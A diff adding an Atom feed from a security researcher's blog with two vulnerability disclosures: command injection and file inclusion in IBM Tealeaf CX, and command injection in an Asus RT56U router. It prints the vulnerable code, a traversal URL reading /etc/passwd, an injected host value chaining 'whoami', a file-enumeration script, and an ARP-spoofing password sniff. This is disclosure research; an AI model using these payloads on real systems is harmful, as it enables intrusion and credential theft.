@@ -1,0 +1,290 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: command injection | ]]></title>
+  <link href="http://hatRiot.github.io/blog/categories/command-injection/atom.xml" rel="self"/>
+  <link href="http://hatRiot.github.io/"/>
+  <updated>2018-05-18T09:39:16-07:00</updated>
+  <id>http://hatRiot.github.io/</id>
+  <author>
+    <name><![CDATA[Bryan Alexander]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[IBM Tealeaf CX (v8 Release 8) Remote OS Command Injection / LFI]]></title>
+    <link href="http://hatRiot.github.io/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi/"/>
+    <updated>2014-03-26T22:51:11-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi</id>
+    <content type="html"><![CDATA[<p>Tealeaf Technologies was <a href="http://techcrunch.com/2012/05/02/ibm-acquires-tealeaf-to-add-customer-buying-analytics-to-smarter-commerce-products/">purchased</a> by IBM in May of 2012, and is a customer buying analytics application.  Essentially, an administrator will configure a Tealeaf server that accepts analytic data from remote servers, which it then generates various models, graphs, reports, etc based on the aggregate of data.
+Their analytics status/server monitoring application is vulnerable to a fairly trivial OS command injection vulnerability, as well as local file inclusion.  This vulnerability was discovered on a PCI engagement against a large retailer; the LFI was used to pull PHP files and hunt for RCE.</p>
+
+<p>The entire application is served up by default on port 8080 and is developed in PHP.  Authentication by default is disabled, however, support for Basic Auth appears to exist.  This interface allows administrators access to statistics, logs, participating servers, and more.  Contained therein is the ability to obtain application logs, such as configuration, maintenance, access, and more.  The log parameter is vulnerable to LFI:</p>
+
+<p>```
+if(array_key_exists(&ldquo;log&rdquo;, $params))
+$path = $config->logfiledir() . &ldquo;/&rdquo; . $params[&ldquo;log&rdquo;];</p>
+
+<p>$file = basename($path);
+$size = filesize($path);</p>
+
+<p>// Set the cache-control and expiration date so that the file expires
+// immediately after download.
+//
+$rfc1123date = gmdate(&rsquo;D, d M Y H:i:s T', 1);
+header(&lsquo;Cache-Control: max-age=0, must-revalidate, post-check=0, pre-check=0&rsquo;);
+header(&ldquo;Expires: &rdquo; . $rfc1123date);</p>
+
+<p>header(&ldquo;Content-Type: application/octet-stream&rdquo;);
+header(&ldquo;Content-Disposition: attachment; filename=$file;&rdquo;);
+header(&ldquo;Content-Length: $size;&rdquo;);</p>
+
+<p>readfile($path);
+```</p>
+
+<p>The URL then is <code>http://host:8080/download.php?log=../../../etc/passwd</code></p>
+
+<p>Tealeaf also suffers from a rather trivial remote OS command injection vulnerability.  Under the Delivery tab, there exists the option to ping remote servers that send data back to the mothership.  Do you see where this is going?</p>
+
+<p>```
+if ($_POST[&ldquo;perform_action&rdquo;] == &ldquo;testconn&rdquo;) {</p>
+
+<pre><code>$host = $_POST["testconn_host"];
+$port = $_POST["testconn_port"];
+$use_t = strtolower($_POST["testconn_t"]) == "true" ? true : false;
+$command = $GLOBALS["config"]-&gt;testconn_program() . ' ';
+if($use_t)
+$output = trim(shell_command_output($command . $host . " -p " . $port . " -t"));
+else
+$output = trim(shell_command_output($command . $host . " -p " . $port));
+
+if($output != "") {
+    $alert_function = "alert('" . str_replace("\n", "\\n",
+    htmlentities($output, ENT_QUOTES)) . "')";
+}
+
+$_SESSION['delivery']-&gt;pending_changes = $orig_pending_changes;
+</code></pre>
+
+<p>}
+```</p>
+
+<p>And shell_command_output:</p>
+
+<p>```
+function shell_command_output($command) {</p>
+
+<pre><code>$result = `$command 2&gt;&amp;1`;
+if (strlen($result) &gt; 0)
+return $result;
+</code></pre>
+
+<p>}
+```</p>
+
+<p>Harnessing the <code>$host</code> variable, we can inject arbitrary commands to run under the context of the process user, which by default is <code>ctccap</code>.  In order to exploit this without hanging processes or goofing up flow, I injected the following as the host variable: <code>8.8.8.8 -c 1 ; whoami ; ping 8.8.8.8 -c 1</code>.</p>
+
+<h3>Timeline</h3>
+
+
+<ul>
+<li>11/08/2013: IBM vulnerability submitted</li>
+<li>11/09/2013: IBM acknowledge vulnerability and assign internal advisory ID</li>
+<li>12/05/2013: Request for status update</li>
+<li>01/06/2014: Second request for status update</li>
+<li>01/23/2014: IBM responds with a target patch date set for &ldquo;another few months&rdquo;</li>
+<li>03/26/2014: IBM posts advisory, assigns CVE-2013-6719 and CVE-2013-6720</li>
+</ul>
+
+
+<p><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21667630">Advisory</a><br/>
+<a href="http://www.exploit-db.com/exploits/32546/">exploit-db PoC</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Asus RT56U Remote Command Injection]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/06/05/asus-rt56u-remote-command-injection/"/>
+    <updated>2013-06-05T22:45:20-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/06/05/asus-rt56u-remote-command-injection</id>
+    <content type="html"><![CDATA[<p>After discovering a couple vulnerabilities in the Asus RT56U prior, I decided to check out the latest firmware and hunt around for a few more.</p>
+
+<p>I was running 3.0.0.4.342, which happens to be one version behind the latest (3.0.0.4.360), so I did a sweep of both.  I enabled telnet on the router and hunted around, which led me to an unlinked page, Main_Analysis_Content.asp.  This page hosts a slew of diagnostic tools, including the ability to ping network systems.  See where this is going?</p>
+
+<p><img class="center <a" src="href="http://4.bp.blogspot.com/-4C_1Ig7iJos/UZwIsAqjHqI/AAAAAAAAAeo/hC3nnlBbyb8/s640/command_injection.jpg">http://4.bp.blogspot.com/-4C_1Ig7iJos/UZwIsAqjHqI/AAAAAAAAAeo/hC3nnlBbyb8/s640/command_injection.jpg</a>"></p>
+
+<p>And the related source code to this:</p>
+
+<p><code>
+document.form.SystemCmd.value = "ping -c " + document.form.pingCNT.value + " " + document.form.destIP.value;
+</code></p>
+
+<p>Pretty trivial, and each command, ping, nslookup, and traceroute, is vulnerable.  The system is running an HTTP web server that serves up ASP pages, so we could wget and deploy a reverse ASP shell or set up a netcat listener.</p>
+
+<p>I then took a look at the latest firmware, which touts the following changes:</p>
+
+<p><code>
+ASUS RT-N56U Firmware Version 3.0.0.4.360
+1. AiCloud
+For iOS user, please upgrade app to 1.02.78 or above
+(for more information, please refer to http://event.asus.com/2012/nw/aicloud/index.htm)
+2. Network tools in Advanced setting
+3. WOL user interface
+4. H.323 and SIP passthrough can be disabled in Advanced Settings --&gt; WAN --&gt;NAT Passthrough
+5. Click the device name and lookup the manufacturer information
+6. Change the DHCP query frequency in Advanced settings--&gt;WAN--&gt;Internet connection to resolve the ISP compatibility issue.
+</code></p>
+
+<p>So it looks like the tools were added in the .342 (or earlier) firmware, but not actually linked until the .360 release.  I then flashed over the firmware to take a look at any changes.  It appeared they added a Network Tools section which, of course, allows us to:</p>
+
+<p><img class="center <a" src="href="http://3.bp.blogspot.com/-ZFhW0bRKM3o/UZwoiPOXXyI/AAAAAAAAAe4/WyTtjhpQEho/s640/asus_exec_360.jpg">http://3.bp.blogspot.com/-ZFhW0bRKM3o/UZwoiPOXXyI/AAAAAAAAAe4/WyTtjhpQEho/s640/asus_exec_360.jpg</a>"></p>
+
+<p>It&rsquo;s kind of ridiculous that we can hit /etc/shadow with this.</p>
+
+<p>As an aside, I thought about what sort of files might be accessible without authenticating to the web server.  Seeing as I had access to enumerate the file system, I constructed a listing of every file in the web server&rsquo;s root.  The code can be seen below:</p>
+
+<p>```
+import urllib, urllib2</p>
+
+<p>def get_files():</p>
+
+<pre><code>files = []
+with open('files_rt.txt', 'r') as f:
+    files = [x.strip() for x in f.readlines()]
+print '[!] Built %d files to test...'%len(files)
+return files
+</code></pre>
+
+<p>def run():</p>
+
+<pre><code>files        = get_files()
+open_files   = []
+
+for f in files:
+    url = 'http://192.168.1.1/'+f
+    try:
+        data = urllib2.urlopen(url).read()
+    except urllib2.HTTPError as e:
+        continue
+
+    open_files.append(url)
+
+print '[!] %d exposed files'%len(open_files)
+for f in open_files: print '\t[!] %s'%f
+</code></pre>
+
+<p>def parse_args():</p>
+
+<pre><code>pass
+</code></pre>
+
+<p>if <strong>name</strong> == &ldquo;<strong>main</strong>&rdquo;:</p>
+
+<pre><code>run()
+</code></pre>
+
+<p>```</p>
+
+<p>When run, 42 files were exposed:</p>
+
+<p>```
+bryan@devbox:~$ python rt56u_iter.py
+[!] Built 277 files to test&hellip;
+[!] 42 exposed files</p>
+
+<pre><code>[!] http://192.168.1.1/NM_style.css
+[!] http://192.168.1.1/Nologin.asp
+[!] http://192.168.1.1/PIE.htc
+[!] http://192.168.1.1/ParentalControl.css
+[!] http://192.168.1.1/WAN_info.asp
+[!] http://192.168.1.1/app_installation.css
+[!] http://192.168.1.1/detect_firmware.asp
+[!] http://192.168.1.1/error_page.htm
+[!] http://192.168.1.1/fan.svg
+[!] http://192.168.1.1/form_style.css
+[!] http://192.168.1.1/get_webdavInfo.asp
+[!] http://192.168.1.1/gotoHomePage.htm
+[!] http://192.168.1.1/httpd_check.htm
+[!] http://192.168.1.1/index_style.css
+[!] http://192.168.1.1/jquery.js
+[!] http://192.168.1.1/menu_style.css
+[!] http://192.168.1.1/other.css
+[!] http://192.168.1.1/pwdmeter.css
+[!] http://192.168.1.1/remote.asp
+[!] http://192.168.1.1/tm.svg
+[!] http://192.168.1.1/tmmenu.css
+[!] http://192.168.1.1/update_applist.asp
+[!] http://192.168.1.1/update_appstate.asp
+[!] http://192.168.1.1/update_cloudstatus.asp
+[!] http://192.168.1.1/ure_success.htm
+[!] http://192.168.1.1/ureip.asp
+[!] http://192.168.1.1/usp_style.css
+[!] http://192.168.1.1/aidisk/AiDisk_style.css
+[!] http://192.168.1.1/aidisk/aidisk.css
+[!] http://192.168.1.1/device-map/device-map.css
+[!] http://192.168.1.1/iui/Button_low.jpg
+[!] http://192.168.1.1/iui/check.png
+[!] http://192.168.1.1/iui/default-theme.css
+[!] http://192.168.1.1/iui/iui.css
+[!] http://192.168.1.1/iui/listArrow.png
+[!] http://192.168.1.1/iui/listArrow_setting.png
+[!] http://192.168.1.1/iui/toolButton.png
+[!] http://192.168.1.1/calendar/fullcalendar.css
+[!] http://192.168.1.1/svghtc/svg.htc
+[!] http://192.168.1.1/svghtc/svg.swf
+[!] http://192.168.1.1/qis/qis_style.css
+[!] http://192.168.1.1/qis/qis_style_m.css
+</code></pre>
+
+<p>```</p>
+
+<p>A majority of the files are pretty useless/uninteresting, such as the css/jpg/png files, but a couple of the ASP files have some interesting information.  <code>Nologin.asp</code> lets us know every address the DHCP server has leased out, as well as the IP of the currently logged in administrator.  <code>get_webdavInfo.asp</code> gives us a bunch of great info, including the firmware version, DDNS information, mode of operation, and more.</p>
+
+<p>The only really interesting page to me is <code>Nologin.asp</code>.  This gives us the currently logged in administrator; so, if we&rsquo;re on the local network, we can generate a short script that periodically pings the router and alerts us when an admin logs in.  We can then ARPP the administrator and hijack the password; this works because the router&rsquo;s web server doesn&rsquo;t do any session management, it simply uses basic HTTP auth to send the base64&rsquo;d password.</p>
+
+<p>Observe:</p>
+
+<p><img class="center <a" src="href="http://1.bp.blogspot.com/-uPMtGiHrr8c/Ua_L3lVLl9I/AAAAAAAAAf4/QIhMSOdOfvM/s640/no_login.jpg">http://1.bp.blogspot.com/-uPMtGiHrr8c/Ua_L3lVLl9I/AAAAAAAAAf4/QIhMSOdOfvM/s640/no_login.jpg</a>"></p>
+
+<p>Now we know where the administrator is logged in.  We can now ARPP the host and hijack the password.  It is unnecessary for the administrator to actually be doing anything, because conveniently the client&rsquo;s browser sends out an ajax request to <code>/ajax_status.asp</code> quite often, complete with authentication credentials.  Using zarp, a network attack tool designed by yours truly, we can ARPP the admin and set up a password sniffer:</p>
+
+<p>```</p>
+
+<pre><code>[Running sessions]
+</code></pre>
+
+<p>[1] ARP Spoof</p>
+
+<pre><code>[0] 192.168.1.219
+</code></pre>
+
+<p>[2] Password Sniffer</p>
+
+<pre><code>[0] 192.168.1.219
+
+
+[1] Stop session
+[2] View session
+[3] Start session logger
+[4] Stop session logger
+</code></pre>
+
+<p>0) Back</p>
+
+<blockquote><p>2
+[module] [number]> 2 0
+[!] [enter] when finished
+[!] Dumping output from &lsquo;Password Sniffer&rsquo;&hellip;
+[!] Host: 192.168.1.1
+[!] User: admin:*********
+```</p></blockquote>
+
+<p>Immediately we catch a heartbeat and grab the password (edited out).</p>
+
+<p>Lastly, this is full disclosure.  Check out <a href="http://seclists.org/fulldisclosure/2013/Mar/126">this</a> listing for how Asus treats security researchers.</p>
+]]></content>
+  </entry>
+  
+</feed>
